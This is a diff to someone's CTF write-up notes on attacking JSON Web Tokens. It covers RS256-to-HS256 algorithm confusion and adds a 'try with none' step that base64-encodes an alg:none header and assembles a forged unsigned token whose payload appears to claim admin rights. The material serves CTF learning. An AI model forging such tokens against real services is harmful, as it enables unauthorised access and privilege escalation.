@@ -42,4 +42,12 @@ MzZjOGRlNWUiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzEzMDkzMzM2fQo.
 - uses private key to sign and public key to verify
 - as we have access to public key we can sign our data with this key and say the algorith is hs256(symmetric enc)
 - ![image](https://github.com/m0wn1ka/ctf/assets/127676379/9718b95b-6bbb-49f2-a7de-326096ffe668)
+## try with none
+```
+C:\home\radha> echo '{"alg":"none","typ":"JWT"}'|base64
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K
 
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJ1c2VyIjoidXNlcjEiLCJwdWJsaWNfaWQiOiJlZWJlNGJkNy05YzQ0LTRjODQtYTliYi1kYWQz
+```
+MzZjOGRlNWUiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzEzMDkzMzM2fQo.
+             
